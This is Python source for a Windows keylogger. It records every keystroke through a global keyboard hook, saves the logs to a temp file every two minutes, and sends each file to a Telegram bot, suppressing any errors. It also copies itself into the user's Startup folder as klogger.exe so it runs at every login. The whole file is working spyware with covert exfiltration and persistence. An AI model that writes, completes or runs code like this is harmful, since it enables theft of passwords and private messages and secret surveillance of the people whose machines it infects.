from modules.modules import *

LOG_INTERVAL = 120

class klogger:
    def __init__(self , interval) -> None:
        self.interval = interval
        self.log = " "
        self.start_t = datetime.now()
        self.end_t = datetime.now()
    
    def callback(self, event):
        name = event.name
        if len(name) > 1:
            match (name):
                case ("space"):
                    name = " "
                case ("enter"):
                    name = "\n"
                case ("decimal"):
                    name = "."
                case (_):
                    name = name
            name = name.replace(" ", "_")
            name = f"[{name.upper()}]"
        
        self.log += name
        
    def report(self):
        if self.log:
            self.end_t = datetime.now()
            self.save_to_file()
            self.send()
        self.log = ""

        timer = threading.Timer(interval=self.interval , function=self.report)
        timer.daemon = True
        timer.start()

    def save_to_file(self):
        start_dt_str = str(self.start_t)[:-7].replace(" ", "-").replace(":", "")
        end_dt_str = str(self.end_t)[:-7].replace(" ", "-").replace(":", "")

        self.fname = f"""{TMP}keylog_{start_dt_str}_{end_dt_str}_data.txt"""

        with open(self.fname , '+a') as f:
            f.write(self.log)

    def send(self):
        try:
            bot = telepot.Bot(TOKEN)
            bot.sendDocument(CHATID , open(self.fname , 'r'))
        except:
            pass

    def start(self):
        self.start_t = datetime.now()
        keyboard.on_release(callback=self.callback)
        self.report()
        keyboard.wait()


def add_to_startup():
    cwd = os.getcwd()
    user_dir = os.path.expanduser('~')
    file_name = os.path.basename(sys.argv[0])
    temp_dir =  f'{user_dir}\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup'
    try:
        with open(f"{cwd}\\{file_name}" , 'rb') as f:
            with open(f"{temp_dir}\\klogger.exe" , 'xb') as nf:
                nf.write(f.read())
                f.close()
                nf.close()
    except FileExistsError:
        pass



if __name__ == "__main__":
    logging.basicConfig(level=logging.DEBUG , filename=f"{TMP}log")
    start = threading.Thread(target=add_to_startup , daemon=True)
    start.start()
    start.join()
    kl = klogger(interval=LOG_INTERVAL)
    kl.start()
# # end main
    

    